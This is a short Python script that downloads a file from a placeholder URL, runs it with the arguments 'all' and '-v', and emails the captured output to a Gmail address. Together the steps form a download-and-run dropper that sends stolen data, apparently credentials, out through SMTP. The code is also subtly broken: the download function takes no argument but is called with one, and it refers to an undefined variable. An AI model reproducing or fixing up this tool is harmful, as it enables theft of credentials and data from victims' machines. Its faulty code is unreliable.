#!/usr/bin/env python
import subprocess
import smtplib
import requests

def get_payload():
        get_request = requests.get(url)
        print(get_request.content)
        name = url.split("/")[-1]
        with open(name, "wb") as payload:
            payload.write(get_request.content)

def mail_it(email, passwd, to_mail, msg):
    mailserver = smtplib.SMTP("smtp.gmail.com", 587)
    mailserver.starttls()
    mailserver.login(email, passwd)
    mailserver.sendmail(email, to_mail, msg)
    mailserver.quit()

URL= "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
get_payload(URL)
file_name = URL.split("/")[-1]
process = subprocess.Popen([file_name, 'all', '-v'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
result, error = process.communicate()
try:
    message = result.decode('latin-1').encode("utf-8")
except:
    message = str(result)
mail_it("xxxxxxxxxx@gmail.com", "***********", "xxxxxxxxxxx@gmail.com", message)
